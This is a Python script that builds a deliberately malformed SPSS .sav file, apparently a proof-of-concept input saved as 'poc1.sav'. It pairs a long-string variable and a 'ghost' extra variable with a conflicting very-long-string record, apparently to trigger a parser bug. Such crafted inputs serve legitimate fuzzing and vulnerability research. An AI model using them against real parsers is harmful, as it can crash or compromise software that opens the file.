import struct, pathlib
p=bytearray()
# header 176 bytes
p += b'$FL2'
p += b'PYGEN'.ljust(60,b' ')
p += struct.pack('<i',2) # layout
p += struct.pack('<i',33) # nominal case size? var_offset maybe okay
p += struct.pack('<i',0) # no compression
p += struct.pack('<i',0) # weight
p += struct.pack('<i',1) # ncases
p += struct.pack('<d',100.0)
p += b'01 Jan 21'
p += b'00:00:00'
p += b''.ljust(64,b' ')
p += b'\0'*3
assert len(p)==176

def rec_var(vtype, name=b'VAR00001', printv=None, writev=None):
    global p
    if printv is None:
        # type A width min(type,255), decimal 0 => (format type 1 <<16) | width<<8
        w = 255 if vtype<0 else (vtype if vtype>0 else 8)
        printv=(1<<16)|(w<<8)
    if writev is None: writev=printv
    p.extend(struct.pack('<i',2))
    p.extend(struct.pack('<iiiII', vtype,0,0,printv,writev))
    p.extend(name[:8].ljust(8,b' '))
# base long string width 255 + 31 negative continuations => width 32
rec_var(255, b'VAR00001')
for i in range(31):
    rec_var(-1, b'        ', printv=0x011d01, writev=0x011d01)
# ghost second segment type 1, name can be VAR0000A
rec_var(1, b'VAR0000A')
# integer info subtype 3, size 4 count 8, charcode UTF-8
p.extend(struct.pack('<iiii',7,3,4,8))
p.extend(struct.pack('<iiiiiiii',1,0,0,0,0,0,1,65001))
# very long string record subtype 14 size 1 count len, data format key=value \0 \t optional
vls=b'VAR00001=253\0\t'
p.extend(struct.pack('<iiii',7,14,1,len(vls)))
p.extend(vls)
# termination rec type 999 + filler
p.extend(struct.pack('<ii',999,0))
# data row: 33 8-byte cells all NUL
p.extend(b'\0'*(33*8))
pathlib.Path('/workspace/poc1.sav').write_bytes(p)
print(len(p))
